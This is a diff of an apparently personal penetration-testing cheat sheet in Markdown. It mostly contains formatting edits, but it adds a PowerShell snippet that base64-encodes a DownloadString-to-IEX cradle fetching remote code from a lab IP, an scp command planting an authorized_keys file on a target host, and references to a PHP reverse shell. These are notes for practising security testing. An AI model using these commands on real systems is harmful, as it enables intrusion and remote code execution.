@@ -159,25 +159,15 @@ xclip -selection c /usr/share/webshells/php/php-reverse-shell.php
 
 * Ctrl-Shift-E: Split the view vertically.
 
-<!---->
-
-* Ctrl-Shift-O: Split the view horizontally.
-
-<!---->
+- Ctrl-Shift-O: Split the view horizontally.
 
 * Ctrl-Shift-P: Focus on the previous view.
 
-<!---->
-
-* Ctrl-Shift-N: Focus on the next view.
-
-<!---->
+- Ctrl-Shift-N: Focus on the next view.
 
 * Ctrl-D: Close the view where the focus is on.
 
-<!---->
-
-* Ctrl-Shift-Q: Exit terminator.
+- Ctrl-Shift-Q: Exit terminator.
 
 </details>
 
@@ -185,7 +175,7 @@ xclip -selection c /usr/share/webshells/php/php-reverse-shell.php
 
 <summary>Command Prompt Disabled By Administrator</summary>
 
-* Upload [http://didierstevens.com/files/software/cmd-dll\_v0\_0\_4.zip](http://didierstevens.com/files/software/cmd-dll\_v0\_0\_4.zip)
+* Upload [http://didierstevens.com/files/software/cmd-dll\_v0\_0\_4.zip](http://didierstevens.com/files/software/cmd-dll_v0_0_4.zip)
 * Run `cmd.exe` locally
 
 </details>
@@ -327,6 +317,29 @@ Means victim is running legacy SCP server --> req us to use legacy SCP protocol
 
 ```bash
 scp -O -i id_rsa authorized_keys max@192.168.199.100:/home/max/.ssh/authorized_keys
+```
+
+</details>
+
+<details>
+
+<summary>B64 Encoding Using Powershell</summary>
+
+```powershell
+$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+$EncodedText = [Convert]::ToBase64String($bytes)
+$EncodedText
+```
+
+</details>
+
+<details>
+
+<summary>Print a Specific Line Number</summary>
+
+```bash
+sed -n 43p shellcoderunner.ps1 
 ```
 
 </details>
